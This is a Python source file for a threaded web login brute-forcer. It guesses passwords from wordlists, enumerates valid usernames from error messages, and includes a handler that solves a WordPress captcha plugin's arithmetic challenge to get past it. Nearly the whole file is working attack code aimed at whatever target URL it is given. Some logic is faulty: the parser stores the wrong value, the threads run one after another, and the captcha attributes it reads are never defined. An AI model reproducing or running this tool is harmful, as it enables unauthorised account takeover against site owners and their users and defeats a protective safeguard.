import urllib
import threading
import sys
import queue
import requests

from html.parser import HTMLParser


class Bruter(object):
    def __init__(self, target_url = None, username=None, passwords_list=None, usernames_list = None, user_threads=1, cms=None, resume = None):
        self.target_url = target_url
        self.target_post = target_url
        self.username = username
        self.found = False
        self.cms = cms
        self.resume = resume
        self.password_q = self.build_wordlist(passwords_list)
        self.username_q = self.build_wordlist(usernames_list)
        self.threads = user_threads
        self.unprobable_password = "/.,.,adsfasdkkkdfjlk3//.3.,,,.kjlksdf"
        self.discovered_usernames = []
        print("Finished setting up Bruter object")
        self.set_cms()
    
    def set_cms(self):
       self.username_field= "username"
       self.password_field= "passwd"
       self.success_check = "Control Panel"

    def get_discovered_usernames(self):
        return self.discovered_usernames

    def run_username_bruteforce(self):
       print("Launching the attack using %i threads"%self.threads)
       if self.threads <2:
           self.web_username_bruter()
       else:
           for i in range(self.threads):
               t = threading.Thread(target=self.web_username_bruter)
               t.start()
               t.join()

    def run_password_bruteforce(self):
       print("Launching the attack using %i threads"%self.threads)
       if self.threads <2:
           self.web_password_bruter()
       else:
           for i in range(self.threads):
               t = threading.Thread(target=self.web_password_bruter)
               t.start()
               t.join()

    def web_password_bruter(self):

        #loop until end of password list or until password found
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()

            #we use a session object here, so it handles the cookies for us
            session = requests.Session()
            response = session.get(self.target_url)
            page = response.text

            print("Trying: %s : %s (%d left)" % (self.username,brute,
                    self.password_q.qsize()))
            
            # parse out the hidden fields
            parser = BruteParser()

            #This method feed the html code received to the 
            #BruteParser. The over written handle_starttag 
            #method will take care of modifying it.
            parser.feed(page)

            #getting the all the name/value pairs in the inputs tag
            #from the html response
            post_tags = parser.tag_results


            # add our username and password fields
            post_tags[self.username_field] = self.username
            post_tags[self.password_field] = brute
            #post_tags['wp-submit'] = 'submit'
            #login_data = urllib.urlencode(post_tags)

            login_response = session.post(self.target_post, data=post_tags)
            print(post_tags)

            # print the html returned or something more intelligent to see if it's a successful login page.
            login_result = login_response.text

            if self.success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % self.username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")


    def web_username_bruter(self):

        #loop until end of password list or until password found
        while not self.username_q.empty():
            brute = self.username_q.get().rstrip()

            #we use a session object here, so it handles the cookies for us
            session = requests.Session()
            response = session.get(self.target_url)
            page = response.text

            print("Trying: %s (%d left)" % (brute, self.username_q.qsize()))
            
            # parse out the hidden fields
            parser = BruteParser()
            #This method feed the html code received to the 
            #BruteParser. The over written handle_starttag 
            #method will take care of modifying it.
            parser.feed(page)

            #getting the all the name/value pairs in the inputs tag
            #from the html response
            post_tags = parser.tag_results

            #check if captch block was found
            #and set up the values
            if parser.data_captcha_block:
                #create and fill the captcha handler
                captcha_handler = CaptchaHandler()
                captcha_handler.value1 = parser.data_captcha_block[3]
                captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
                captcha_handler.operator = parser.charref_captcha_block or parser.entityref_captcha_block 

                #compute the captcha value
                captcha_value = captcha_handler.compute_captcha_value()
                post_tags['ux_txt_captcha_input'] = captcha_value

            # add our username and password fields
            post_tags[self.username_field] = brute
            post_tags[self.password_field] = self.unprobable_password
            login_response = session.post(self.target_post, data=post_tags)
            login_result = login_response.text

            if not "Invalid username" in login_result:
                print("Username %s is valid" %brute)
                self.discovered_usernames.append(brute)


    def build_wordlist(self, wordlist_file):

        print("Building the word list")
        # read in the word list
        fd = open(wordlist_file,"rb")
        raw_words = fd.readlines()
        fd.close()
        found_resume = False
        words= queue.Queue()
    
        for word in raw_words:
            word = word.rstrip()
            if self.resume is not None:
                if found_resume:
                    words.put(word)
                else:
                    if word == self.resume:
                        found_resume = True
                        print("Resuming wordlist from: %s" % self.resume)
            else:
                words.put(word)
    
        return words


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    #This method is automaticaly called during self.feed()
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = value

class CaptchaHandler:
    ''' Class to handle the captcha from the Captcha Bank plugin
        in Wordpress'''

    def __init__(self):
        self.value1 = 0
        self.value2 = 0
        self.operator = ''

    def compute_captcha_value(self):
        '''If the captcha is numerical calculation, 
        this method makes the calculation from the output of 
        the BruteHTMLParser'''

        #check if the integers are integers
        self.sanity_check_captcha_values()

        #check the operator
        self.sanity_check_captcha_operator()

        if self.operator == 'minus':
            return self.value1 - self.value2

        elif self.operator == 'times':
            return self.value1 * self.value2

        elif self.operator == 'plus':
            return self.value1 + self.value2
        
        else:
            return self.value1 / self.value2


    def sanity_check_captcha_values(self):
        '''Sanity check for the input values'''
        self.value1 = int(self.value1.replace('=',''))
        self.value2 = int(self.value2.replace('=',''))
 
    def sanity_check_captcha_operator(self):
        '''Sometimes the operator is not cleary mentionned.
            We have to find a way to determine it...'''

        if self.operator == '43':
            self.operator = 'plus'
        elif self.operator == '8260':
            self.operator = 'divide'
